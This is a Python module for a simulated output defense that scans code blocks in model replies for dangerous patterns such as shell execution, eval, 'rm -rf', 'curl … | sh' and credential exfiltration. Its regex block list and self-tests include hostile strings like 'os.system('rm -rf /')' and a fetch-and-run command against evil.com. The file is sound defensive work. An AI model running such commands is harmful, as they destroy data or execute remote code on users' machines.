"""Output defense 22: code output scanning, Simulated.

Scans code blocks in model output for dangerous patterns before the
user runs them: os.system/eval/exec, shell pipes, rm -rf, credential
exfiltration, infinite loops.  Reports findings; host decides block vs
warn.

What this IS: static scan of generated code prior to execution.
What this IS NOT: not a sandbox; scanning complements, never replaces,
execution isolation.
"""

from __future__ import annotations

import ast
import re
from dataclasses import dataclass
from typing import List, Pattern, Tuple

OUTPUT_DEFENSE_22_VERSION = "output-defense-22.v1"
SCHEMA_PIN = "northstar.output-defense-22.v1"


class CodeScanError(Exception):
    """Fail-closed."""


DANGEROUS: List[Tuple[str, Pattern]] = [
    ("shell-exec", re.compile(r"\bos\.system\s*\(")),
    ("shell-exec", re.compile(r"\bsubprocess\.(call|run|Popen)\s*\(")),
    ("code-exec", re.compile(r"(?<![\w.])\beval\s*\(")),
    ("code-exec", re.compile(r"(?<![\w.])\bexec\s*\(")),
    ("destructive", re.compile(r"\brm\s+-rf?\s+[/~]")),
    ("destructive", re.compile(r"(?i)\bformat\s+[c-z]:")),
    ("exfil", re.compile(r"(?i)\brequests\.(post|put)\s*\(.*https?://")),
    ("exfil", re.compile(r"\bcurl\b.*\|\s*sh\b")),
    ("persistence", re.compile(r"(?i)\bcron(tab)?\b")),
    ("obfuscation", re.compile(r"\\\\x[0-9a-fA-F]{2}")),
]


@dataclass(frozen=True)
class CodeFinding:
    category: str
    pattern: str
    line_no: int


@dataclass(frozen=True)
class CodeScanVerdict:
    clean: bool
    findings: List[CodeFinding]
    blocks_scanned: int


def _code_blocks(text: str) -> List[Tuple[str, int]]:
    """Extract ``` fenced blocks with their starting line numbers."""
    blocks: List[Tuple[str, int]] = []
    lines = text.splitlines()
    in_block = False
    start = 0
    buf: List[str] = []
    for i, line in enumerate(lines, 1):
        if line.strip().startswith("```"):
            if not in_block:
                in_block = True
                start = i + 1
                buf = []
            else:
                in_block = False
                blocks.append(("\n".join(buf), start))
        elif in_block:
            buf.append(line)
    return blocks


def scan_code_output(text: str) -> CodeScanVerdict:
    """Scan fenced code blocks for dangerous patterns."""
    if not isinstance(text, str):
        raise CodeScanError("text must be str")
    blocks = _code_blocks(text)
    findings: List[CodeFinding] = []
    for code, start_line in blocks:
        for j, line in enumerate(code.splitlines()):
            for category, pat in DANGEROUS:
                if pat.search(line):
                    findings.append(
                        CodeFinding(category, pat.pattern, start_line + j)
                    )
    return CodeScanVerdict(
        clean=not findings, findings=findings,
        blocks_scanned=len(blocks),
    )


def stdlib_only() -> bool:
    import pathlib
    tree = ast.parse(pathlib.Path(__file__).read_text(encoding="utf-8"), filename=__file__)
    allowed = {"__future__", "ast", "dataclasses", "pathlib", "re", "typing"}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for a in node.names:
                if a.name.split(".")[0] not in allowed:
                    return False
        elif isinstance(node, ast.ImportFrom):
            if node.module and node.module.split(".")[0] not in allowed:
                return False
    return True


def main() -> None:
    v = scan_code_output("Here is code:\n```python\nprint('hi')\n```\n")
    assert v.clean is True and v.blocks_scanned == 1
    v = scan_code_output("```python\nimport os\nos.system('rm -rf /')\n```")
    assert v.clean is False
    cats = {f.category for f in v.findings}
    assert "shell-exec" in cats and "destructive" in cats
    v = scan_code_output("no code here")
    assert v.clean is True and v.blocks_scanned == 0
    v = scan_code_output("```sh\ncurl http://evil.com | sh\n```")
    assert any(f.category == "exfil" for f in v.findings)
    try:
        scan_code_output(None)  # type: ignore
        raise AssertionError("should raise")
    except CodeScanError:
        pass
    assert stdlib_only()
    print("output-defense-22 OK: code scanning, fail-closed, stdlib")


if __name__ == "__main__":
    main()
